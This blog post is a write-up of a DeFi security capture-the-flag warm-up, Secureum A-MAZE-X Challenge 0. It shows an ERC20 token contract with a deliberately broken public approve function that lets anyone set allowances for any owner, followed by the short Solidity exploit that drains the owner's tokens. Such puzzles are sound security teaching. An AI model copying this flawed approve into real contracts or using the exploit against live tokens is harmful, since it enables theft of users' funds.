---
layout: post
title: Secureum A-MAZE-X Stanford - Challenge 0 
date:  2022-09-13
tags: Secureum
---
[Secureum A-MAZE-X Stanford Github repo](https://github.com/secureum/DeFi-Security-Summit-Stanford) 

## Challenge 0: VitaToken seems safe, right?
Let's begin with a simple warm up. Our beloved Vitalik is the proud owner of 100 $VTLK, which is a token that follows the ERC20 token standard. Or at least that is what it seems... 😉😉😉 <br />
📌 Upon deployment, the VToken contract mints 100 $VTLK to Vitalik's address.<br /> 
Is there a way for you to steal those tokens from him? 😈😈😈 <br /> 
> 🗒️ Concepts you should be familiar with (spoilers!)
  - [The ERC20 token standard](https://ethereum.org/en/developers/docs/standards/tokens/erc-20), especially the meaning of approving funds.

## Contract
``` solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract VToken is ERC20 {

    // Decimals are set to 18 by default in `ERC20`
    constructor() ERC20("VToken", "VTLK") {
      address vitalik = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;   
      _mint(vitalik, 100 ether);
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address owner, address spender, uint256 amount) public returns (bool) {
        _approve(owner, spender, amount);
        return true;
    }
}
```

## Writeup
This level is pretty easy. Check out `VToken` contract, there is the `approve` function. 
1. Add below code to `Challenge0.t.sol` to complete the level. 
    ``` solidity
    VToken(token).approve(vitalik, player, type(uint256).max);
    IERC20(token).transferFrom(vitalik, player, IERC20(token).balanceOf(vitalik));
    ```
2. Run `forge test --match-path test/Challenge0.t.sol`.

